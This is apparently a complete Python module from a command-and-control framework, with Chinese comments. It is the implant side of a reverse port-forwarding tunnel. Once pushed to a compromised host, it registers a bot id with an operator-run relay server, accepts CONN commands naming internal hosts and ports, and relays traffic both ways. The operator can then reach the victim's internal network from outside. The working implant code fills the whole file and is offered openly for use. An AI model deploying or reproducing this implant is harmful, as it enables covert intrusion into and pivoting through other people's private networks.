"""portfwd — 端口转发(植入物端): 连接独立部署的 protfwd_server 隧道端口。

流程:
  1) 连接 protfwd_server 隧道端口, 发送 `REG <bid>` 建立控制连接(长连接)
  2) 循环接收指令 `CONN <token> <host> <port>`(目标地址由 protfwd_server
     部署时内嵌) → 每会话线程: 新建数据连接(HELLO <bid> <token>) →
     连接目标 host:port → 双向转发
  3) 服务端停止/网络断开 → 控制连接 recv 返回空 → run() 返回, 线程退出

配合: server 端 s_exec protfwd_server <listen> <target_host> <target_port>
生成服务端部署代码; 操作机连接 protfwd_server 的转发端口即到达目标内网端口。
"""

MODULE = {
    "desc": "端口转发: 连接独立部署的 protfwd_server(目标端口映射到公网)",
    "params": [("server_ip", "必填；protfwd_server 服务器地址"),
               ("server_port", "必填；protfwd_server 隧道端口")],
}


def _session(token, host, port, sip, spt):
    """单个 CONN 会话: 数据连接 + 目标连接 双向转发。"""
    import socket as _s
    import threading as _t
    d = tg = None
    try:
        d = _s.create_connection((sip, int(spt)), timeout=15)
        d.settimeout(120)
        d.sendall(("HELLO %s %s\n" % (_D, token)).encode())
        tg = _s.create_connection((host, port), timeout=15)
        tg.settimeout(120)

        def fwd(a, b):
            try:
                while True:
                    x = a.recv(65536)
                    if not x:
                        break
                    b.sendall(x)
            except OSError:
                pass
            finally:
                try:
                    b.shutdown(_s.SHUT_WR)
                except OSError:
                    pass

        _t.Thread(target=fwd, args=(d, tg), daemon=True).start()
        fwd(tg, d)
    except Exception:
        pass
    finally:
        for x in (d, tg):
            if x is not None:
                try:
                    x.close()
                except OSError:
                    pass


def run(server_ip, server_port):
    import socket as _s
    import threading as _t
    try:
        c = _s.create_connection((server_ip, int(server_port)), timeout=15)
        c.settimeout(120)
        c.sendall(("REG %s\n" % _D).encode())
    except Exception as e:
        return "(portfwd error: 连 protfwd_server 失败 %s)" % e
    try:
        while True:
            data = c.recv(4096)
            if not data:
                break  # 服务端停止/断开 → 退出线程
            for line in data.decode("utf-8", "replace").splitlines():
                line = line.strip()
                if line.startswith("CONN "):
                    p = line.split()
                    if len(p) >= 4:
                        _t.Thread(target=_session,
                                  args=(p[1], p[2], int(p[3]),
                                        server_ip, server_port),
                                  daemon=True).start()
    except OSError:
        pass
    finally:
        try:
            c.close()
        except OSError:
            pass
    return "(portfwd 已退出: protfwd_server 连接断开)"


if __name__ == "__main__":
    print("portfwd: 由 server 下发执行(参数: server_ip server_port)")
